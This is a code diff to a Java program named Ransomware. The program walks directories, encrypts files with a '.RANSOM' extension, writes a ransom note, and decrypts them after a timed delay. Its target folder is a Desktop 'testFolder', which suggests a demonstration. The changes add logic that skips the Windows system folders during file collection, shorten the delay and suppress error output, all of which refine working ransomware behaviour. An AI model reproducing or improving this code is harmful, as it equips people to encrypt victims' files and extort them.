@@ -31,7 +31,7 @@ import javax.crypto.spec.SecretKeySpec;
 public class Ransomware {
 	
 	// In milliseconds, how long to wait before things are decrypted.
-	private static final int DECRYPTION_DELAY = 60000;
+	private static final int DECRYPTION_DELAY = 10000;
 	private static final int IV_LENGTH = 16;
 	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
 	private static final String EXTENSION = ".RANSOM";
@@ -152,7 +152,14 @@ public class Ransomware {
 	            if (file.isFile()) {
 	                files.add(file);
 	            } else if (file.isDirectory()) {
-	            	getAllFiles(file.getAbsolutePath(), files, placeNote);
+	            	// Skip over Windows OS folders
+	            	if(!(file.getAbsolutePath().equals("C:\\Program Files") ||
+	            	   file.getAbsolutePath().equals("C:\\Program Files (x86)") ||
+	            	   file.getAbsolutePath().equals("C:\\Windows"))) 
+	            	{
+		            	getAllFiles(file.getAbsolutePath(), files, placeNote);
+	            	}
+
 	            }
 	        }
 	    }
@@ -167,7 +174,7 @@ public class Ransomware {
 			output.write(RANSOM_TEXT);
 			output.close();
 		} catch (IOException e) {
-			e.printStackTrace();
+			//e.printStackTrace();
 		}
 	}
 
@@ -482,7 +489,8 @@ public class Ransomware {
 		try {
 			newFile.createNewFile();
 		} catch (IOException e) {
-			e.printStackTrace();
+			System.out.println("Could not create file at: " + file.getAbsolutePath() + EXTENSION);
+			//e.printStackTrace();
 		}	
 		
 		return newFile;
@@ -497,12 +505,12 @@ public class Ransomware {
 					stream.write(array);
 		    	}
 			} catch (IOException e) {
-				e.printStackTrace();
+				//e.printStackTrace();
 			}
 		} catch (FileNotFoundException e1) {
-			e1.printStackTrace();
+			//e1.printStackTrace();
 		} catch (IOException e1) {
-			e1.printStackTrace();
+			//e1.printStackTrace();
 		}
 	}
 }
